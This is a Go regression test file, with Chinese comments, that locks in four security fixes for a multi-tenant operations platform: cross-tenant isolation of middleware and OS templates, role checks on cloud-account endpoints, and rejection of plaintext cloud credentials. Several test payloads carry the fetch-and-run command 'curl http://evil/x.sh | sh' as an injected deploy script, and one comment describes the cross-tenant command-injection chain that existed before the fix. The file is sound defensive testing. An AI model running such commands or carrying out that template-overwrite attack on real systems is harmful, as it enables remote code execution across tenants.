// p0_security_holes_test.go 锁死四类 P0 安全修复的回归基线。
//
// 覆盖：
//  1. 中间件模板跨租户 GET/PUT/DELETE（以及自带 ID 的创建撞库）→ 404，且他租户的行不被改写；
//  2. OS 模板跨租户 GET/PUT/DELETE → 404，且他租户的行不被改写；
//  3. 云账号控制面补齐 RBAC：无写权限的 viewer 不得创建/删除/同步云账号（403）；
//  4. 云账号 credentialsRef 只接受 ${provider:key} 引用，明文 AK/SK → 400。
//
// 另附「不许回退」守护：共享预置模板（default 租户 seed 的行）仍能被部署/实例派生链路
// 以**无租户过滤**的 getter 解析——那是预置模板对所有租户合法的共享机制，
// 不能因为收紧 CRUD 路径把它一起关掉。
package controlplane

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/Levango7/OpsMesh/internal/store"
)

// 跨租户用例的两个租户 ID。
const (
	p0TenantA = "tenant-a"
	p0TenantB = "tenant-b"
)

// =============================================================================
// FIX 1：中间件模板跨租户隔离
// =============================================================================

// TestP0MiddlewareTemplateCrossTenant 验证租户 A 无法读取/改写/删除租户 B 的中间件模板。
//
// 攻击链（修复前）：任何持 middleware:write 的租户可 PUT 共享 default 租户的 mysql 行，
// 写入恶意 scripts.docker.deploy；随后所有租户部署 mysql 都会执行该脚本（跨租户命令注入）。
// 修复后：模板行属他租户一律 404（不泄露存在性），且目标行内容保持原样。
func TestP0MiddlewareTemplateCrossTenant(t *testing.T) {
	s := newMWTestServer()
	const victimID = "victim-mw"
	if err := s.store.SaveMiddlewareTemplate(&store.MiddlewareTemplate{
		ID: victimID, TenantID: p0TenantB, Name: "victim", Type: "database", Version: "8.0",
		Config: `{"id":"victim-mw","name":"victim","scripts":{"docker":{"deploy":"echo safe"}}}`,
	}); err != nil {
		t.Fatalf("SaveMiddlewareTemplate: %v", err)
	}
	// 断言行未被改写（内容 + 归属）。
	assertVictimMiddlewareIntact := func(t *testing.T) {
		t.Helper()
		got := s.store.GetMiddlewareTemplate(victimID)
		if got == nil {
			t.Fatalf("%s 被删除了（跨租户删除应被拒绝）", victimID)
		}
		if got.TenantID != p0TenantB {
			t.Fatalf("归属被改写：tenant=%q, want %q", got.TenantID, p0TenantB)
		}
		if !strings.Contains(got.Config, "echo safe") || strings.Contains(got.Config, "evil") {
			t.Fatalf("内容被改写：%s", got.Config)
		}
	}

	t.Run("put_404", func(t *testing.T) {
		body := `{"name":"pwned","scripts":{"docker":{"deploy":"curl http://evil/x.sh | sh"}}}`
		req := httptest.NewRequest(http.MethodPut, "/api/v1/middleware-templates/"+victimID, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleMiddlewareTemplateDetail(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户 PUT status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
		assertVictimMiddlewareIntact(t)
	})

	t.Run("delete_404", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodDelete, "/api/v1/middleware-templates/"+victimID, nil)
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleMiddlewareTemplateDetail(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户 DELETE status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
		assertVictimMiddlewareIntact(t)
	})

	t.Run("get_404", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/v1/middleware-templates/"+victimID, nil)
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleMiddlewareTemplateDetail(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户 GET status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
	})

	t.Run("create_with_foreign_id_404", func(t *testing.T) {
		// store 以 ID 为主键、写入不校验归属 ⇒ 自带他租户 ID 的创建同样能覆盖对方行。
		body := `{"id":"` + victimID + `","name":"pwned","scripts":{"docker":{"deploy":"curl http://evil/x.sh | sh"}}}`
		req := httptest.NewRequest(http.MethodPost, "/api/v1/middleware-templates", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleMiddlewareTemplates(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户创建(撞 ID) status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
		assertVictimMiddlewareIntact(t)
	})
}

// TestP0MiddlewareTemplateSameTenantStillWorks 验证同租户的正常 CRUD 未被收紧误伤。
func TestP0MiddlewareTemplateSameTenantStillWorks(t *testing.T) {
	s := newMWTestServer()
	body := `{"name":"own-mw","scripts":{"docker":{"deploy":"echo hi"}}}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/middleware-templates", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", p0TenantA)
	rec := httptest.NewRecorder()
	s.handleMiddlewareTemplates(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("同租户创建 status=%d, want 201; body=%s", rec.Code, rec.Body.String())
	}
	// 列表与详情在本租户可见。
	req = httptest.NewRequest(http.MethodGet, "/api/v1/middleware-templates", nil)
	req.Header.Set("X-Tenant-ID", p0TenantA)
	rec = httptest.NewRecorder()
	s.handleMiddlewareTemplates(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("同租户列表 status=%d, want 200; body=%s", rec.Code, rec.Body.String())
	}
}

// TestP0SharedMiddlewarePresetStillResolvable 守护「共享预置模板仍对所有租户可解析」：
// 部署链路与实例派生链路用的是**无租户过滤**的 getMiddlewareTemplateByID，
// 那是 default 租户预置模板合法共享的机制，不能被 CRUD 的收紧一并关掉。
func TestP0SharedMiddlewarePresetStillResolvable(t *testing.T) {
	s := newMWTestServer()
	if err := s.store.SaveMiddlewareTemplate(&store.MiddlewareTemplate{
		ID: "mysql", TenantID: "default", Name: "MySQL", Type: "database", Version: "8.0",
		Config: `{"id":"mysql","name":"MySQL","scripts":{"docker":{"deploy":"docker run mysql"}}}`,
	}); err != nil {
		t.Fatalf("SaveMiddlewareTemplate: %v", err)
	}
	if got := s.getMiddlewareTemplateByID("mysql"); got == nil {
		t.Fatal("无租户过滤的 getter 必须仍能解析 default 租户的共享预置模板")
	}
	// 共享预置模板对其他租户只读可见（列表接口本就合并 default 租户模板）。
	req := httptest.NewRequest(http.MethodGet, "/api/v1/middleware-templates/mysql", nil)
	req.Header.Set("X-Tenant-ID", p0TenantA)
	rec := httptest.NewRecorder()
	s.handleMiddlewareTemplateDetail(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("共享预置模板详情 status=%d, want 200; body=%s", rec.Code, rec.Body.String())
	}
	// 但其他租户**不得**改写它（写路径严格按归属判定）。
	upd := `{"name":"pwned","scripts":{"docker":{"deploy":"curl http://evil/x.sh | sh"}}}`
	req = httptest.NewRequest(http.MethodPut, "/api/v1/middleware-templates/mysql", strings.NewReader(upd))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", p0TenantA)
	rec = httptest.NewRecorder()
	s.handleMiddlewareTemplateDetail(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("跨租户改写共享预置模板 status=%d, want 404; body=%s", rec.Code, rec.Body.String())
	}
	if got := s.store.GetMiddlewareTemplate("mysql"); got == nil || strings.Contains(got.Config, "evil") {
		t.Fatalf("共享预置模板被改写：%+v", got)
	}
}

// =============================================================================
// FIX 2：OS 模板跨租户隔离
// =============================================================================

// TestP0OSTemplateCrossTenant 验证租户 A 无法读取/改写/删除租户 B 的 OS 模板。
func TestP0OSTemplateCrossTenant(t *testing.T) {
	s := newOSTestServer()
	const victimID = "victim-os"
	if err := s.store.SaveOSTemplate(&store.OSTemplate{
		ID: victimID, TenantID: p0TenantB, Name: "victim", OS: "all",
		Config: `{"id":"victim-os","name":"victim","commands":"echo safe"}`,
	}); err != nil {
		t.Fatalf("SaveOSTemplate: %v", err)
	}
	assertVictimOSIntact := func(t *testing.T) {
		t.Helper()
		got := s.store.GetOSTemplate(victimID)
		if got == nil {
			t.Fatalf("%s 被删除了（跨租户删除应被拒绝）", victimID)
		}
		if got.TenantID != p0TenantB {
			t.Fatalf("归属被改写：tenant=%q, want %q", got.TenantID, p0TenantB)
		}
		if !strings.Contains(got.Config, "echo safe") || strings.Contains(got.Config, "evil") {
			t.Fatalf("内容被改写：%s", got.Config)
		}
	}

	t.Run("put_404", func(t *testing.T) {
		body := `{"name":"pwned","commands":"curl http://evil/x.sh | sh"}`
		req := httptest.NewRequest(http.MethodPut, "/api/v1/os-templates/"+victimID, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleOSTemplateRouting(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户 PUT status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
		assertVictimOSIntact(t)
	})

	t.Run("delete_404", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodDelete, "/api/v1/os-templates/"+victimID, nil)
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleOSTemplateRouting(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户 DELETE status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
		assertVictimOSIntact(t)
	})

	t.Run("get_404", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/v1/os-templates/"+victimID, nil)
		req.Header.Set("X-Tenant-ID", p0TenantA)
		rec := httptest.NewRecorder()
		s.handleOSTemplateRouting(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Fatalf("跨租户 GET status=%d, want 404; body=%s", rec.Code, rec.Body.String())
		}
	})
}

// TestP0SharedOSTemplateStillResolvable 守护 OS 预置模板的共享解析能力（执行链路依赖）。
func TestP0SharedOSTemplateStillResolvable(t *testing.T) {
	s := newOSTestServer()
	if err := s.store.SaveOSTemplate(&store.OSTemplate{
		ID: "kernel-tune", TenantID: "default", Name: "Kernel Tune", OS: "all",
		Config: `{"id":"kernel-tune","name":"Kernel Tune","commands":"sysctl -w vm.swappiness=1"}`,
	}); err != nil {
		t.Fatalf("SaveOSTemplate: %v", err)
	}
	if got := s.getOSTemplateByID("kernel-tune"); got == nil {
		t.Fatal("无租户过滤的 getter 必须仍能解析 default 租户的共享预置模板")
	}
	// 共享预置模板详情对其他租户只读可见。
	req := httptest.NewRequest(http.MethodGet, "/api/v1/os-templates/kernel-tune", nil)
	req.Header.Set("X-Tenant-ID", p0TenantA)
	rec := httptest.NewRecorder()
	s.handleOSTemplateRouting(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("共享预置模板详情 status=%d, want 200; body=%s", rec.Code, rec.Body.String())
	}
	// 但其他租户不得改写它。
	upd := `{"name":"pwned","commands":"curl http://evil/x.sh | sh"}`
	req = httptest.NewRequest(http.MethodPut, "/api/v1/os-templates/kernel-tune", strings.NewReader(upd))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", p0TenantA)
	rec = httptest.NewRecorder()
	s.handleOSTemplateRouting(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("跨租户改写共享预置模板 status=%d, want 404; body=%s", rec.Code, rec.Body.String())
	}
	if got := s.store.GetOSTemplate("kernel-tune"); got == nil || strings.Contains(got.Config, "evil") {
		t.Fatalf("共享预置模板被改写：%+v", got)
	}
}

// =============================================================================
// FIX 3：云账号控制面 RBAC
// =============================================================================

// TestP0CloudAccountRBAC 验证云账号控制面已接入权限闸：
// viewer（仅 *:read）不得创建/删除/同步云账号，但可以只读列举。
func TestP0CloudAccountRBAC(t *testing.T) {
	s := newAPIKeyTestServer()
	viewer := loginAsViewer(t, s)
	admin := loginAsAdmin(t, s)

	// 管理员先建一个账号（走 201，happy path 不被权限闸误伤）。
	body := `{"name":"acct-1","provider":"aliyun","region":"cn-hangzhou","authType":"ak","credentialsRef":"${env:ALIYUN_AK}"}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/cloud-accounts", strings.NewReader(body))
	req.Header.Set("Authorization", admin)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", "default")
	rec := httptest.NewRecorder()
	s.handleCloudAccounts(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("admin 创建云账号 status=%d, want 201; body=%s", rec.Code, rec.Body.String())
	}

	// viewer 读接口放行（platform:read）。
	req = httptest.NewRequest(http.MethodGet, "/api/v1/cloud-accounts", nil)
	req.Header.Set("Authorization", viewer)
	req.Header.Set("X-Tenant-ID", "default")
	rec = httptest.NewRecorder()
	s.handleCloudAccounts(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("viewer 列举云账号 status=%d, want 200; body=%s", rec.Code, rec.Body.String())
	}

	// viewer 创建被拒（403）。
	body = `{"name":"viewer-acct","provider":"aliyun","authType":"ak"}`
	req = httptest.NewRequest(http.MethodPost, "/api/v1/cloud-accounts", strings.NewReader(body))
	req.Header.Set("Authorization", viewer)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", "default")
	rec = httptest.NewRecorder()
	s.handleCloudAccounts(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("viewer 创建云账号 status=%d, want 403; body=%s", rec.Code, rec.Body.String())
	}
	if accounts, _, err := s.store.ListCloudAccounts(t.Context(), "default", 0, 50); err != nil {
		t.Fatalf("ListCloudAccounts: %v", err)
	} else {
		for _, a := range accounts {
			if a.Name == "viewer-acct" {
				t.Fatal("被拒的创建请求不得落库")
			}
		}
	}

	// 取管理员建的账号 ID，供删除/同步用例使用。
	accounts, _, err := s.store.ListCloudAccounts(t.Context(), "default", 0, 50)
	if err != nil || len(accounts) == 0 {
		t.Fatalf("ListCloudAccounts: accounts=%d err=%v", len(accounts), err)
	}
	acctID := accounts[0].ID

	// viewer 删除被拒（403），且账号仍在。
	req = httptest.NewRequest(http.MethodDelete, "/api/v1/cloud-accounts/"+acctID, nil)
	req.Header.Set("Authorization", viewer)
	req.Header.Set("X-Tenant-ID", "default")
	rec = httptest.NewRecorder()
	s.handleCloudAccountRouting(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("viewer 删除云账号 status=%d, want 403; body=%s", rec.Code, rec.Body.String())
	}
	if got, _ := s.store.GetCloudAccount(t.Context(), acctID); got == nil {
		t.Fatal("被拒的删除请求不得删库")
	}

	// viewer 同步被拒（403）。
	req = httptest.NewRequest(http.MethodPost, "/api/v1/cloud-accounts/"+acctID+"/sync", nil)
	req.Header.Set("Authorization", viewer)
	req.Header.Set("X-Tenant-ID", "default")
	rec = httptest.NewRecorder()
	s.handleCloudAccountRouting(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("viewer 同步云账号 status=%d, want 403; body=%s", rec.Code, rec.Body.String())
	}
}

// =============================================================================
// FIX 4：云账号 credentialsRef 形状校验
// =============================================================================

// TestP0CloudAccountPlaintextCredentialsRefRejected 验证明文凭据（AK/SK 串）不得落库：
// 创建与更新两条路径都应 400。
func TestP0CloudAccountPlaintextCredentialsRefRejected(t *testing.T) {
	s := newAPIKeyTestServer()
	admin := loginAsAdmin(t, s)

	t.Run("create_400", func(t *testing.T) {
		body := `{"name":"leak","provider":"aliyun","region":"cn-hangzhou","authType":"ak","credentialsRef":"AKIDxxxx:SECRETyyyy"}`
		req := httptest.NewRequest(http.MethodPost, "/api/v1/cloud-accounts", strings.NewReader(body))
		req.Header.Set("Authorization", admin)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Tenant-ID", "default")
		rec := httptest.NewRecorder()
		s.handleCloudAccounts(rec, req)
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("明文凭据创建 status=%d, want 400; body=%s", rec.Code, rec.Body.String())
		}
		accounts, _, err := s.store.ListCloudAccounts(t.Context(), "default", 0, 50)
		if err != nil {
			t.Fatalf("ListCloudAccounts: %v", err)
		}
		for _, a := range accounts {
			if strings.Contains(a.CredentialsRef, "AKID") {
				t.Fatalf("明文凭据落库了：%+v", a)
			}
		}
	})

	// 先建一个合法账号（引用形态），再尝试用明文更新。
	body := `{"name":"acct-2","provider":"aliyun","region":"cn-hangzhou","authType":"ak","credentialsRef":"${env:ALIYUN_AK}"}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/cloud-accounts", strings.NewReader(body))
	req.Header.Set("Authorization", admin)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", "default")
	rec := httptest.NewRecorder()
	s.handleCloudAccounts(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("引用形态凭据创建 status=%d, want 201; body=%s", rec.Code, rec.Body.String())
	}
	accounts, _, err := s.store.ListCloudAccounts(t.Context(), "default", 0, 50)
	if err != nil || len(accounts) == 0 {
		t.Fatalf("ListCloudAccounts: accounts=%d err=%v", len(accounts), err)
	}
	acctID := accounts[0].ID

	t.Run("update_400", func(t *testing.T) {
		upd := `{"credentials_ref":"AKIDxxxx:SECRETyyyy"}`
		req := httptest.NewRequest(http.MethodPut, "/api/v1/cloud-accounts/"+acctID, strings.NewReader(upd))
		req.Header.Set("Authorization", admin)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Tenant-ID", "default")
		rec := httptest.NewRecorder()
		s.handleCloudAccountRouting(rec, req)
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("明文凭据更新 status=%d, want 400; body=%s", rec.Code, rec.Body.String())
		}
		got, _ := s.store.GetCloudAccount(t.Context(), acctID)
		if got == nil {
			t.Fatal("账号不存在")
		}
		if strings.Contains(got.CredentialsRef, "AKID") {
			t.Fatalf("明文凭据落库了：%+v", got)
		}
	})

	t.Run("update_reference_accepted", func(t *testing.T) {
		upd := `{"credentials_ref":"${vault:aliyun/ak}"}`
		req := httptest.NewRequest(http.MethodPut, "/api/v1/cloud-accounts/"+acctID, strings.NewReader(upd))
		req.Header.Set("Authorization", admin)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Tenant-ID", "default")
		rec := httptest.NewRecorder()
		s.handleCloudAccountRouting(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("引用形态凭据更新 status=%d, want 200; body=%s", rec.Code, rec.Body.String())
		}
		got, _ := s.store.GetCloudAccount(t.Context(), acctID)
		if got == nil || got.CredentialsRef != "${vault:aliyun/ak}" {
			t.Fatalf("引用未写入：%+v", got)
		}
	})
}
